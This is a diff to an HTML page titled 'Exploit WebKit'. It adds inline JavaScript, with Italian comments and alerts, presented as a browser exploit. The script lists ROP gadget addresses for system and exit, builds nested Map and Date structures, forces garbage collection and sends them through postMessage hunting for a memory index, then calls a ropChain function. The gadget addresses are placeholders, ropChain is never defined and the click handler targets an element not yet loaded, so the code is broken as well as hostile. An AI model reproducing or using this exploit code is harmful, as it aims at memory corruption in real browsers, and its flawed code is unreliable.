@@ -4,9 +4,109 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Exploit WebKit</title>
+    <script>
+        const gadgets = {
+            pop_rdi: 0x0000000000401234,
+            pop_rsi: 0x0000000000405678,
+            pop_rdx: 0x0000000000409abc,
+            ret: 0x000000000040abcd,
+            system: 0x0000000000401111,
+            exit: 0x0000000000402222
+        };
+
+        // Garbage Collection
+        function gc() {
+            try {
+                new Uint8Array(256 * 1024); // Alloca memoria per attivare il GC
+                alert('GC eseguita.');
+            } catch (e) {
+                console.error("Errore durante la GC:", e.message);
+            }
+        }
+
+        // Crea struttura di memoria
+        function createObjectStructure(numElems) {
+            let root = new Map();
+            let msg = root;
+            let foo = [];
+
+            for (let i = 0; i < 5; i++) {
+                foo.push(new Date(0xffff)); // Oggetti placeholder
+            }
+
+            for (let i = 0; i < numElems; i++) {
+                const d = new Date(i);
+                const map = new Map();
+                msg.set(d, [map, foo]);
+                msg = map;
+            }
+
+            gc();
+            alert('Struttura oggetti creata.');
+            return root;
+        }
+
+        // Funzione principale
+        async function main() {
+            alert("Inizio exploit...");
+
+            const numElems = 10;
+            let root = createObjectStructure(numElems);
+            let msg = root;
+            let idx = null;
+            let found = false;
+            let attempts = 0;
+            const maxAttempts = 3; // Limite per evitare loop infiniti
+
+            while (!found && attempts < maxAttempts) {
+                attempts++;
+                try {
+                    let data = null;
+                    const prom = new Promise(resolve => {
+                        addEventListener('message', event => {
+                            data = event.data;
+                            resolve();
+                        }, { once: true });
+                    });
+
+                    alert(`Tentativo ${attempts}: Invio messaggio...`);
+                    postMessage(msg, '*');  // Invio messaggio
+                    await prom;
+
+                    alert("Messaggio ricevuto con successo.");
+                    gc();
+
+                    // Ricerca dell'indice
+                    for (let i = 0; i < numElems; i++) {
+                        if (data.keys().next().value.getTime() === 0xffff) {
+                            idx = i;
+                            found = true;
+                            break;
+                        }
+                        data = data.values().next().value[0];
+                    }
+                } catch (e) {
+                    console.error("Errore durante la ricerca dell'indice:", e.message);
+                    alert("Errore: " + e.message);
+                }
+            }
+
+            if (found) {
+                alert('[+] Indice trovato: ' + idx);
+                let rop = ropChain();
+                alert("ROP Chain creata. Exploit completato.");
+            } else {
+                alert("Indice non trovato. Exploit fallito.");
+            }
+        }
+
+        // Avvia exploit al click
+        document.getElementById('runExploit').addEventListener('click', async () => {
+            await main();
+        });
+    </script>
 </head>
 <body>
     <button id="runExploit">Avvia Exploit</button>
-    <script src="exploit.js"></script>
 </body>
 </html>
